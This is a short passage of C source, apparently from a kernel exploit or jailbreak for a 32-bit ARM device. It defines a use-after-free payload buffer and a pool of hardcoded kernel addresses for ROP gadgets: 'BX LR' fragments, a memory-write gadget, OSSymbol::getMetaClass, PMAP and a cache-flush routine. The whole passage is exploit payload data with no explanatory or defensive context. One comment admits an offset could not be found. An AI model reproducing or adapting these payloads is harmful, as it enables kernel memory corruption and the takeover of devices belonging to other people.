...
static uint8_t uaf_payload_buffer[] = {
    ...
    0xdc, 0xd9, 0x0d, 0x00, // [14] address of "BX LR" code fragment 0xDD9DC
    0x00, 0x00, 0x00, 0x00, // [18] NULL
    0xa1, 0x9e, 0x31, 0x00, // [1C] address of OSSymbol::getMetaClass (+1) 0x319EA1
    0xdc, 0xd9, 0x0d, 0x00, // [20] address of "BX LR" code fragment 0xDD9DE
    0xdc, 0xd9, 0x0d, 0x00, // [24] address of "BX LR" code fragment 0xDD9DE
};

static uint32_t addresses_pool[] = {
    0x000CA5A8, // WRITE_GADGET // address of "str r1, [r0, #0xc] ; bx lr" 0xCA5A8
    0x003f6444, // PMAP 0x3F6444
    0x000BE598, // FLUSH_DCACHE  UNABLE TO FIND OFFSET 0xBE598
